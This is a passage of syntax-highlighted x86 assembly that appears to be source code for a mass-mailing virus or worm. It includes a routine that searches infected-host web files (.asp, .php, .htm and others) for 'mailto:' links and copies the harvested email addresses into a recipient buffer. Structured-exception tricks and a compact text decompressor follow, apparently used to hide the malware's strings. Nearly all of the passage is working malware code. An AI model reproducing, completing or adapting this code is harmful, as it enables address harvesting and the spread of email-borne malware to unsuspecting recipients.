        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapsehstk.mapsehinfret</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">;skip call mask</span><span class="sc0">

</span><span class="sc5">inftest_ret</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if suffix is any of .asp, .cfm, .css, .jsp, .[?]php* .[?]htm*</span><span class="sc0">
</span><span class="sc1">;then search for "mailto:" and save address if '@' is found</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">inftest_name</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.cFileName</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">store_charnext</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"!bgr"</span><span class="sc0">

</span><span class="sc5">find_suffix</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_suffix</span><span class="sc0">                     </span><span class="sc1">;support only one suffix</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">get_suffix</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;Unicode character</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">                         </span><span class="sc1">;convert to lowercase</span><span class="sc0">
        </span><span class="sc6">shrd</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">get_suffix</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" psa"</span><span class="sc0">                     </span><span class="sc1">;.asp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_text</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" mfc"</span><span class="sc0">                     </span><span class="sc1">;.cfm</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_text</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" ssc"</span><span class="sc0">                     </span><span class="sc1">;.css</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_text</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" psj"</span><span class="sc0">                     </span><span class="sc1">;.jsp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_text</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'p'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">and_suffix</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'h'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">and_suffix</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                          </span><span class="sc1">;skip first character</span><span class="sc0">

</span><span class="sc5">and_suffix</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"php"</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">;.[?]php</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_text</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"mth"</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">;.[?]htm</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc5">found_text</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;page fault exit if no mailto:</span><span class="sc0">

</span><span class="sc5">find_mailto</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'m'</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scas</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"tlia"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_mailto</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">":o"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_mailto</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">find_mailend</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'@'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skip_at</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">skip_at</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                           </span><span class="sc1">;" -&gt; '</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_mailend</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">mailtest_ret</span><span class="sc0">                    </span><span class="sc1">;too few or too many '@'s</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_recip</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">400fffh</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;no thread sync because EnterCriticalSection is forwarded in NT/2000/XP</span><span class="sc0">
</span><span class="sc1">;and my import resolver doesn't support forwarded imports</span><span class="sc0">
</span><span class="sc1">;the solution is to write in reverse direction which avoids crash</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">mailtest_ret</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">decomptest</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">decompcall</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">decompfirst</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">decompcall</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompress</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decompfirst</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decompmulti</span><span class="sc0">

</span><span class="sc5">decomplast</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompress</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">decompmulti</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decomplast</span><span class="sc0">

</span><span class="sc5">decompmain</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decomptest</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">decomptest</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;4/5-bit text decompressor by RT Fishel, based on algorithm by qkumba in 1986!</span><span class="sc0">
</span><span class="sc1">;decompresses A-Z, a-z, 0-9, 3 user characters, lookup table for more characters</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">decompress</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;al -&gt; src length, esi -&gt; src buffer, edi -&gt; dst buffer</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'!'</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1fh</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decomploop</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">user1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user3</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">usertable</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".-&lt;&gt;=()"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"';+!?"</span><span class="sc0">
                                                </span><span class="sc1">;max 32 characters, sort by frequency for best compression</span><span class="sc0">
</span><span class="sc5">usertable_e</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usertable_e</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usertable</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">gt</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc9">.err</span><span class="sc0">    </span><span class="sc3">"too many user characters"</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc9">ife</span><span class="sc0"> </span><span class="sc5">compress_only</span><span class="sc0">

</span><span class="sc5">decompbase</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decomploop</span><span class="sc0">

</span><span class="sc5">decompcase</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">decomploop</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompload</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">decompcmp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">decompcmp</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">                         </span><span class="sc1">;case switch</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">decompcase</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">decompimm</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">decompbase</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decompuser</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompload</span><span class="sc0">

        </span><span class="sc1">;this instruction appears twice because the "add al, 3"</span><span class="sc0">
        </span><span class="sc1">;can overflow in 4-bit mode.  if "and al, dh" appears</span><span class="sc0">
        </span><span class="sc1">;after that, then the result is wrong character</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;skip user1, user2, user3</span><span class="sc0">

</span><span class="sc5">decompuser</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decompstore</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decompstore</span><span class="sc0">

</span><span class="sc5">decompimm</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">decompstore</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">

</span><span class="sc5">decompstore</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
